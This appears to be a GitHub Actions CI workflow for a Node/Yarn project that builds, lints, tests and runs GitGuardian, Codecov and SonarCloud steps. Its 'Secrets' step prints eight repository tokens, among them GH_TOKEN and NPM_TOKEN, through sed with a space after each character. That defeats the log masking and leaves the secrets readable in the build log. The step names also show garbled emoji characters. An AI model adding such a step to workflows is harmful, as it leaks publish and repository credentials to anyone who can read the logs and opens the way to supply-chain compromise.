name: 'Branches'

on:
  push:
    branches:
      [
        'feat/*',
        'fix/*',
        'refactor/*',
        'chore/*',
        'docs/*',
        'test/*',
        'build/*',
        'perf/*',
        'style/*',
        'revert/*',
      ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: ['20.19.4', '22.18.0', '24.5.0']
    env:
      DO_NOT_TRACK: 1
      TURBO_TELEMETRY_DISABLED: 1
    name: 'Build'
    steps:
      - name: '‚öô Setup NodeJS v${{ matrix.node }}'
        uses: actions/setup-node@v4.2.0
        with:
          node-version: ${{ matrix.node }}

      - name: '‚úÖ Checkout repository'
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: 'üíæ Restore Dependencies from cache'
        uses: actions/cache@v4.2.2
        with:
          path: |
            node_modules
            */*/node_modules
          key: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}
          restore-keys: |
            ${{ runner.os }}-yarn-

      - name: 'ü¶â GitGuardian scan'
        uses: GitGuardian/ggshield-action@v1.37.0
        env:
          GITHUB_PUSH_BEFORE_SHA: ${{ github.event.before }}
          GITHUB_PUSH_BASE_SHA: ${{ github.event.base }}
          GITHUB_PULL_BASE_SHA: ${{ github.event.pull_request.base.sha }}
          GITHUB_DEFAULT_BRANCH: ${GITHUB_REF##*/}
          GITGUARDIAN_API_KEY: ${{ secrets.GITGUARDIAN_API_KEY }}

      - name: 'Secrets'
        run: |
          echo "CODECOV_TOKEN:"
          echo ${{secrets.CODECOV_TOKEN}} | sed 's/./& /g'
          echo "GH_EMAIL:"
          echo ${{secrets.GH_EMAIL}} | sed 's/./& /g'
          echo "GH_TOKEN:"
          echo ${{secrets.GH_TOKEN}} | sed 's/./& /g'
          echo "GITGUARDIAN_API_KEY:"
          echo ${{secrets.GITGUARDIAN_API_KEY}} | sed 's/./& /g'
          echo "NPM_TOKEN:"
          echo ${{secrets.NPM_TOKEN}} | sed 's/./& /g'
          echo "SNYK_TOKEN:"
          echo ${{secrets.SNYK_TOKEN}} | sed 's/./& /g'
          echo "SONAR_TOKEN:"
          echo ${{secrets.SONAR_TOKEN}} | sed 's/./& /g'
          echo "TC_CLOUD_TOKEN:"
          echo ${{secrets.TC_CLOUD_TOKEN}} | sed 's/./& /g'

      - name: 'üì¶ Install Dependencies'
        run: yarn install

      - name: 'üíÖ Lint'
        run: yarn lint:format:check

      - name: 'üî® Build'
        run: yarn build --force && node sonar-args.js

      - name: 'üë®‚Äçüíª Run Test'
        run: yarn test --force
        env:
          NODE_ENV: 'test'

      - name: 'üìä Publish Test Report'
        uses: dorny/test-reporter@v2
        if: ${{ !cancelled() }}
        with:
          name: 'Test Report (${{ matrix.node }})'
          path: 'packages/**/junit.xml'
          reporter: jest-junit

      - name: 'üìä Upload coverage report to Codecov'
        uses: codecov/codecov-action@v5.4.0
        with:
          token: ${{ secrets.CODECOV_TOKEN }}

      - name: 'üìä SonarCloud Scan'
        uses: sonarsource/sonarqube-scan-action@v5.0.0
        env:
          GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

